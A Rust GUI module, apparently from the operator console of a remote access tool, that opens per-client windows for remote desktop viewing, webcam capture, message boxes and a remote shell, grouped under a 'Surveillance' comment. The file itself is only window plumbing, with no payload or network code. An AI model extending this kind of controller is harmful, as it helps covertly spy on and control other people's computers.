use crate::ui::client::ClientView;
use egui::{CentralPanel, Ui, Vec2, ViewportBuilder, ViewportId, vec2};
use std::sync::{Arc, atomic::AtomicBool};

pub mod message_box;
pub mod screen;
pub mod shell;
pub mod webcam;

pub struct ClientWindowState {
    // Surveillance
    pub screen: Arc<AtomicBool>,
    pub camera: Arc<AtomicBool>,

    // Utility
    pub message_box: Arc<AtomicBool>,
    pub shell: Arc<AtomicBool>,
}
impl Default for ClientWindowState {
    fn default() -> Self {
        Self {
            // Surveillance
            screen: Arc::new(AtomicBool::new(false)),
            camera: Arc::new(AtomicBool::new(false)),

            // Utility
            message_box: Arc::new(AtomicBool::new(false)),
            shell: Arc::new(AtomicBool::new(false)), // working on it so show auto
        }
    }
}

fn open(
    view: &mut ClientView,
    ui: &mut Ui,
    open_bool: Arc<AtomicBool>,
    title: String,
    size: Vec2,
    render: fn(&mut ClientView, &mut Ui),
    hash: &str,
) {
    ui.ctx().show_viewport_immediate(
        ViewportId::from_hash_of(format!("{}_{}", view.mutex, hash)),
        ViewportBuilder::default()
            .with_title(title)
            .with_inner_size(size),
        |ctx, _| {
            CentralPanel::default().show(ctx, |ui| {
                render(view, ui);
            });
            if ctx.input(|i| i.viewport().close_requested()) {
                open_bool.store(false, std::sync::atomic::Ordering::Relaxed);
            };
        },
    );
}

pub fn render(view: &mut ClientView, ui: &mut Ui) {
    // Desktop
    let open_bool = view.state.windows.screen.clone();
    if open_bool.load(std::sync::atomic::Ordering::Relaxed) {
        open(
            view,
            ui,
            open_bool,
            format!(
                "Desktop [{}]",
                view.info.hostname.trim_end_matches(char::from(0)) // stop it from cutting off
            ),
            vec2(640.0, 480.0),
            screen::render,
            "screen",
        );
    }
    // Camera
    let open_bool = view.state.windows.camera.clone();
    if open_bool.load(std::sync::atomic::Ordering::Relaxed) {
        open(
            view,
            ui,
            open_bool,
            format!(
                "Camera [{}]",
                view.info.hostname.trim_end_matches(char::from(0)) // stop it from cutting off
            ),
            vec2(640.0, 480.0),
            webcam::render,
            "webcam",
        );
    }

    // MessageBox
    let open_bool = view.state.windows.message_box.clone();
    if open_bool.load(std::sync::atomic::Ordering::Relaxed) {
        open(
            view,
            ui,
            open_bool,
            format!(
                "MessageBox [{}]",
                view.info.hostname.trim_end_matches(char::from(0)) // stop it from cutting off
            ),
            vec2(360.0, 240.0),
            message_box::render,
            "msgbox",
        );
    }
    // Shell
    let open_bool = view.state.windows.shell.clone();
    if open_bool.load(std::sync::atomic::Ordering::Relaxed) {
        open(
            view,
            ui,
            open_bool,
            format!(
                "Shell [{}]",
                view.info.hostname.trim_end_matches(char::from(0)) // stop it from cutting off
            ),
            vec2(400.0, 300.0),
            shell::render,
            "shell",
        );
    }
}
